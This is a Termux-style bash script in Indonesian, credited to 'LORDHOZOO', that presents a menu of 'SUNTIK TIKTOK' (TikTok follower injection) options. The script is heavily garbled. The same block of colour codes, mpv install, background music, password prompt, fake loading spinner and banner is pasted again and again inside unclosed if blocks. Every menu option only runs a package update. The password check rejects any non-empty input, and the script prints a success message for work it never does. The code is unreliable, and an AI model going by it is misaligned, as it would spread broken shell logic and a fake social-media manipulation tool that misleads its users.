if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt  update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update -y
fi



if [ "$updt" -eq 20 ]; then
    # Add your code here for option 20
    apt update -y
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt  update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt  update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
  apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt  update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt  update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt  update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi


if [ "$updt" -eq 21 ]; then
    # Add your code here for option 21
    apt update -y 
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
apt install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi



if [ "$updt" -eq 22 ]; then
    # Add your code here for option 22
    apt update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi


if [ "$updt" -eq 23 ]; then
    # Add your code here for option 23
    apt update -y 
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update -y
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update -y
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi


if [ "$updt" -eq 24 ]; then
    # Add your code here for option 24
    apt  update -y 
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
